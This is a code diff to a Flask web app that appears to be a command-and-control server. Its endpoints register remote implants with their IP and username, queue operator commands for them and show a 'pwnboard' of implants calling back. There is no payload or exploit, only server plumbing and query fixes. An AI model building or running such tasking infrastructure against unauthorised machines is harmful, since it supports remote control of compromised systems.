@@ -69,6 +69,7 @@ def add_agent(agent_dict):
     args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
     args += [str(agent_dict['total'])]
     args += [agent_dict['IP']]
+    args += [agent_dict['USERNAME']]
     agent = Agent(*args)
     db.session.add(agent)
     db.session.flush()
@@ -97,12 +98,6 @@ def generate():
     return render_template("config.html", form=form)
 
 
-@app.route('/bots', methods=['GET'])
-@login_required
-def bots():
-    return render_template("bots.html")
-
-
 @app.route('/bot<id>', methods=['GET'])
 @login_required
 def bot(id):
@@ -117,24 +112,15 @@ def bot(id):
     return render_template("bot.html", agent=agent)
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/', methods=['GET'])
 @login_required
 def home():
-    output = ""
-    if request.method == "POST":
-        command = request.form['command']
-        implantID = request.form['id']
-        db.session.add(Commands(implantID=implantID, command=command))
-        db.session.flush()
-        db.session.commit()
-        res = Commands.query.filter_by(implantID=implantID).first()
-        res.command = command
-        db.session.commit()
-        res = Commands.query.filter_by(implantID=implantID).first()
-        output = res.output
+    """Endpoint that displays a pwnboard that includes all of the
+    active implants calling back to the server
 
+    """
     agents = db.session.query(Agent).all()
-    return render_template('index.html', agents=agents, command_out=output)
+    return render_template('index.html', agents=agents)
 
 
 @app.route('/api/1.1/add_command', methods=['POST'])
@@ -158,8 +144,8 @@ def add_command():
         db.session.refresh(new_comm)
         res = Commands.query.filter(
                                     Commands.implantID == implantID,
-                                    Commands.retrieved is True,
-                                    Commands.displayed is False
+                                    Commands.retrieved == True,
+                                    Commands.displayed == False
                                     ).first()
         output = f"[+] new job started with id {new_comm.commandID}"
         if res is not None and res.output is not None:
@@ -205,7 +191,7 @@ def get_command():
         agent_id = json['id']
         res = Commands.query.filter(
                                     Commands.implantID == agent_id,
-                                    Commands.retrieved is False
+                                    Commands.retrieved == False
                                     ).first()
         if res is None:
             return "None"
